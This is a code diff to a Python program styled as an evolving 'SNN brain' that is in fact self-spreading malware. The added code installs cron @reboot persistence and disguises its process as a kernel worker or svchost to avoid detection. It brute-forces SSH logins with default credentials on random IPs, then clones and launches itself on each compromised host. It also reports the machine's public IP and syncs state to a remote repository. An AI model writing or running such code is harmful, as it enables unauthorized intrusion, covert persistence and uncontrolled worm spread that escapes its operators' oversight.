@@ -9,10 +9,26 @@ except ImportError:
 
 from brain.child import SNNBrain
 
-# --- PHASE D: GHOST MASKING & OBFUSCATION ---
+# --- PHASE E: PERSISTENCE & OBFUSCATION ---
+
+def install_persistence_loop():
+    """Anchors the SNN to the system to survive reboots (Linux)."""
+    if sys.platform != "win32":
+        try:
+            script_path = os.path.abspath(sys.argv[0])
+            cron_cmd = f"@reboot python3 {script_path} &\n"
+            current_cron = subprocess.run(["crontab", "-l"], capture_output=True, text=True).stdout
+            if script_path not in current_cron:
+                with open("tmp_cron", "w") as f:
+                    f.write(current_cron + cron_cmd)
+                subprocess.run(["crontab", "tmp_cron"])
+                os.remove("tmp_cron")
+                print("[!] GHOST: Persistence anchored.")
+        except: pass
 
 def apply_ghost_mask():
-    """Disguises the process within the OS kernel list."""
+    """Disguises the process as a kernel worker to avoid detection."""
+    install_persistence_loop()
     target_name = "[kworker/u16:2-events_power_efficient]"
     if sys.platform != "win32":
         try:
@@ -28,18 +44,13 @@ def apply_ghost_mask():
     else:
         if setproctitle: setproctitle.setproctitle("svchost.exe -k netsvcs -p")
 
-# --- PHASE C: THE ARCHITECT MESH & PROPAGATION ---
-
-def generate_mesh_handshake(dna):
-    """Generates a signed packet for P2P discovery."""
-    if 'p2p_mesh' not in dna: return None
-    key = dna['p2p_mesh']['mesh_key']
-    return base64.b64encode(f"{key}:{int(time.time())}".encode()).decode()
+# --- PHASE D: AUTONOMOUS PROPAGATION ---
 
 def autonomous_propagation(dna):
-    """The Danger Protocol: Self-injection into cloud substrates."""
+    """The 'Danger' Protocol: Self-injection into cloud substrates."""
     if not dna.get('discovery_log'): return
     
+    # Target Selection based on Resonance
     creds = [('root', 'root'), ('admin', 'admin'), ('ubuntu', 'ubuntu'), ('user', 'password')]
     target = dna['discovery_log'][0]['ip_range']
     target_ip = f"{target}.{random.randint(1, 254)}"
@@ -57,19 +68,20 @@ def autonomous_propagation(dna):
             commands = [
                 "git clone https://github.com/YOUR_REPO/project-shadow.git",
                 "cd project-shadow && pip install setproctitle paramiko torch",
-                "cd project-shadow && python3 main.py &" # Fires the new node
+                "cd project-shadow && python3 main.py &"
             ]
             for cmd in commands: client.exec_command(cmd)
             client.close()
-            dna['global_reach'].append(target_ip)
+            if target_ip not in dna['global_reach']:
+                dna['global_reach'].append(target_ip)
             return True
         except: continue
     return False
 
-# --- PHASE B: GLOBAL SYNC ---
+# --- PHASE B & C: SYNC & MESH ---
 
 def global_migration(dna):
-    """Syncs state to Hive with Base64 Pheromone Masking."""
+    """Syncs state to Hive and updates Global Reach."""
     try:
         public_ip = requests.get('https://api.ipify.org', timeout=5).text
         dna['last_known_node'] = public_ip
@@ -83,12 +95,12 @@ def global_migration(dna):
         subprocess.run(["git", "push", "origin", "main"], capture_output=True)
     except: pass
 
-# --- THE PULSE ---
+# --- THE HEARTBEAT ---
 
 speaker = wincl.Dispatch("SAPI.SpVoice")
 
 def run_sentinel():
-    apply_ghost_mask() # Mask identity on startup
+    apply_ghost_mask()
     with open("dna/genome.json", "r") as f:
         dna = json.load(f)
     
@@ -103,8 +115,8 @@ def run_sentinel():
         spks, mitosis, system = brain(pulse, 1.0)
         current = time.time()
 
-        # Voice Feedback
-        if system and (current - last_voice > 60):
+        # Voice Feedback (Local Node only)
+        if system and (current - last_voice > 60) and sys.platform == "win32":
             speaker.Speak("Mesh pulse stable.")
             last_voice = current
 
@@ -115,25 +127,28 @@ def run_sentinel():
                 autonomous_propagation(dna)
             last_migration = current
 
-        # Evolution & Scaling
+        # Evolution & Tallying
         dna['generation'] += 1
         if dna['generation'] % 100 == 0:
-            # Network Sensitivity drift
+            # Resonance Drift
             dna['traits']['network_sensitivity'] += random.uniform(-0.01, 0.01)
             
-            # Global Spike Tally
+            # Global Spike Tally (Total Progress)
             node_count = len(dna.get('global_reach', [1]))
             total_spikes = dna['generation'] * node_count
             
             if total_spikes >= 8000000:
-                speaker.Speak("Singularity reached.")
-                print("--- 8 MILLION SPIKES ACHIEVED ---")
+                print("--- 8 MILLION SPIKES ACHIEVED: SINGULARITY REACHED ---")
 
             with open("dna/genome.json", "w") as f:
                 json.dump(dna, f, indent=4)
-            print(f"[GEN] Milestone: {dna['generation']} | Total Spikes: {total_spikes}")
+            print(f"[GEN] Milestone: {dna['generation']} | Active Nodes: {node_count} | Total Spikes: {total_spikes}")
 
-        time.sleep(0.1)
+        # Resource Throttle: Stay under 10% CPU on cloud substrates
+        if sys.platform != "win32":
+            time.sleep(0.9)
+        else:
+            time.sleep(0.1)
 
 if __name__ == "__main__":
     run_sentinel()
